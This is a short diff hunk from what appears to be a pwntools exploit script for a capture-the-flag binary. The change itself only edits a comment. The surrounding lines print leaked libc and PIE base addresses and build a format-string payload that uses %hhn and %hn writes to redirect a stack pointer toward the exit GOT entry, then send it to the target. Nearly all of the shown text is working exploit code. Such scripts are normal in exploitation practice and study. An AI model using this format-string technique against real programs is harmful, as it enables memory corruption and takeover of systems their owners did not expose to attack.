@@ -121,7 +121,7 @@ def Hack():
  print(hex(libc_base))
  print(hex(pie_base))
 
- # Get pie_address on stack
+ # Get pie_address (exit_got) on stack
  payload3 = f'%{0xdd}c%11$hhn%{ ((pie_base+exe.got["exit"] )&0xffff) - 0xdd}c%10$hn'.ljust(0x20,'A').encode() + p64(stack_leak + 0x30)+p64(stack_leak - 0x8)[0:7]
  print(hex(len(payload3)))
  io.send(payload3)
